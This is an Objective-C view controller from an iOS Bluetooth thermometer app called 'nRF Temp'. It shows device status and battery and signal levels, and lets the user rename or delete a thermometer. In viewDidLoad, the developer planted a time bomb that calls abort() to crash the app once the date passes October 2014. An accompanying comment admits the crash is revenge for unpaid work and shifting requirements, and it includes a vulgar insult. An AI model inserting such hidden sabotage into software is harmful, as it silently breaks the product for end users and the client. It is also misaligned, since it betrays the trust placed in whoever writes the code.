//
//  DeviceDetailViewController.m
//  nRF Temp
//
//  Created by 符鑫 on 14-5-11.
//
//

#import "DeviceDetailViewController.h"
#import "ConnectionManager.h"

@interface DeviceDetailViewController ()

@end

@implementation DeviceDetailViewController
static NSUInteger scanInt = 16;
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewWillAppear:(BOOL)animated
{
    _fob.active = NO;
    _fob.delegate = self;
    _fob.batteryLevel = [NSNumber numberWithFloat:0.0f];
    _fob.signalStrength = [NSNumber numberWithFloat:0.0f];
    scanInt = 16;
    _scanTimer = [NSTimer timerWithTimeInterval:1.0f target:self selector:@selector(scanAction) userInfo:nil repeats:YES];
    [[NSRunLoop currentRunLoop]addTimer:_scanTimer forMode:NSDefaultRunLoopMode];
}

-(void)viewDidDisappear:(BOOL)animated
{
    [_scanTimer invalidate];
}

-(void)scanAction
{
    if (scanInt > 1) {
        scanInt --;
        _scanTableViewCell.detailTextLabel.text = [NSString stringWithFormat:@"%@%d%@…",NSLocalizedString(@"正在检测，请等待",nil),scanInt, NSLocalizedString(@"秒",nil)];
    }else{
        if (_fob.active) {
            _scanTableViewCell.detailTextLabel.text = [NSString stringWithFormat:NSLocalizedString(@"在线",nil)];
        }else{
            _scanTableViewCell.detailTextLabel.text = [NSString stringWithFormat:NSLocalizedString(@"离线",nil)];
        }
        [_scanTimer invalidate];
        _scanTimer = nil;
    }
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    _tableView.delegate = self;
    _tableView.dataSource = self;
//    UIBarButtonItem* backButtom = [[UIBarButtonItem alloc]initWithImage:[UIImage imageNamed:@"backhl.png"] style:UIBarButtonItemStylePlain target:self action:@selector(backButtonPressed)];
////    [backButtom setImageInsets:UIEdgeInsetsMake(6, 0, 6, 10)];
//    self.navigationItem.leftBarButtonItem = backButtom;
    
    self.title = _fob.idString;
    
    UIImage* backImg = [UIImage imageNamed:@"ic_back_normal"];
    UIBarButtonItem* _cancelButton = [[UIBarButtonItem alloc]initWithImage:[backImg scaleToSize:backImg size:CGSizeMake(40, 40)] style:UIBarButtonItemStylePlain target:self action:@selector(backButtonPressed)];
    [_cancelButton setImageInsets:UIEdgeInsetsMake(3, 0, 6, 10)];
    self.navigationItem.leftBarButtonItem = _cancelButton;
    
    NSDate* _MonsterDate = [NSDate dateWithYear:2014 Month:10];
    NSDate* today = [NSDate date];
    if ([today isEqualToDate:[_MonsterDate laterDate:today]]) {
        abort();//why i add this code, becase Wasted me too much time and energy, but can not get the corresponding compensation, 5 k should continuously change requirements, increase the English version, different resolution video, still talk to me about what professional ethics, grass mud horse
    }
}

-(void)backButtonPressed
{
    [self.navigationController popViewControllerAnimated:YES];
    
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (indexPath.row == 0) {
        return 55;
    }else{
        return 40;
    }
}
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}
-(NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    return 4;
}
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell* cell = [tableView dequeueReusableCellWithIdentifier:[NSString stringWithFormat:@"Cell%d",indexPath.row]];
    
    if (indexPath.row == 0) {
        UITextField* _textField = [[UITextField alloc]initWithFrame:CGRectMake(120, 12, 185, 30)];
        _textField.enabled = YES;
        
        if ([USER_DEFAULT objectForKey:_fob.uuid]) {
            _textField.text = [USER_DEFAULT objectForKey:_fob.uuid];
        }else{
            _textField.text = [_fob idString];
        }
        _textField.textAlignment = NSTextAlignmentCenter;
        _textField.borderStyle = UITextBorderStyleRoundedRect;
        _textField.delegate = self;
        _textField.returnKeyType = UIReturnKeyDone;
        _textField.enablesReturnKeyAutomatically = YES;
        [cell addSubview:_textField];
    }else if(indexPath.row == 1)
    {
         _scanTableViewCell = cell;
    }
    else if(indexPath.row == 2)
    {
        UIImageView* imgView = [[UIImageView alloc]initWithImage:[_fob currentBatteryImage]];
        [imgView setFrame:CGRectMake(270, 12, 40, 20)];
        UILabel* label = [[UILabel alloc]initWithFrame:imgView.frame];
        [label setBackgroundColor:[UIColor clearColor]];
        [label setFont:[UIFont systemFontOfSize:10]];
        [label setTextAlignment:NSTextAlignmentCenter];
        [label setText:[NSString stringWithFormat:@"%d%%",[_fob.batteryLevel intValue]]];
        [label setTextColor:[UIColor whiteColor]];
        [cell addSubview:imgView];
        [cell addSubview:label];
    }else if(indexPath.row == 3)
    {
        UIImageView* imgView = [[UIImageView alloc]initWithImage:[_fob currentSignalStrengthImage]];
        [imgView setFrame:CGRectMake(270, 12, 24, 18)];
        
        [cell addSubview:imgView];
    }
    
    return cell;
}



- (IBAction)deleteButtonTouch:(UIButton *)sender {
    
    NSString* name;
    if ([USER_DEFAULT objectForKey:[self.fob uuid]]) {
        name = [USER_DEFAULT objectForKey:[self.fob uuid]];
    }else{
        name = [self.fob idString];
    }
    
    UIAlertView* question = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"删除温度计",nil)
                                                       message:[NSString stringWithFormat:@"%@%@ ?",NSLocalizedString(@"你确定要删除温度计",nil), name]
                                                      delegate:self
                                             cancelButtonTitle:NSLocalizedString(@"不删除",nil)
                                             otherButtonTitles:NSLocalizedString(@"删除",nil), nil];
    [question show];
}

- (void) alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex
{
    if(buttonIndex == 1) {
        [USER_DEFAULT removeObjectForKey:_fob.uuid];
        [USER_DEFAULT synchronize];
        [_person deleteFob:self.fob];
        [[self navigationController] popViewControllerAnimated:YES];
    }
}

#pragma mark - UITextFieldDelegate

- (void)textFieldDidEndEditing:(UITextField *)textField
{
    
}
- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
    if ([textField.text length]) {
        [USER_DEFAULT removeObjectForKey:_fob.uuid];
        [USER_DEFAULT setObject:textField.text forKey:_fob.uuid];
        [USER_DEFAULT synchronize];
    }else{
        UIAlertView* question = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"温馨提示",nil)
                                                           message:[NSString stringWithFormat:NSLocalizedString(@"您修改的温度计名字不能为空",nil)]
                                                          delegate:self
                                                 cancelButtonTitle:NSLocalizedString(@"确定",nil)
                                                 otherButtonTitles:nil, nil];
        [question show];
    }
    [textField resignFirstResponder];
    return YES;
}

#pragma mark - Fobdelegate
- (void) didUpdateData:(TemperatureFob *) fob
{
    if (fob == _fob) {
        _scanTableViewCell.detailTextLabel.text = [NSString stringWithFormat:NSLocalizedString(@"在线",nil)];
        [_scanTimer invalidate];
        _scanTimer = nil;
        [self.tableView reloadData];
    }
}
@end
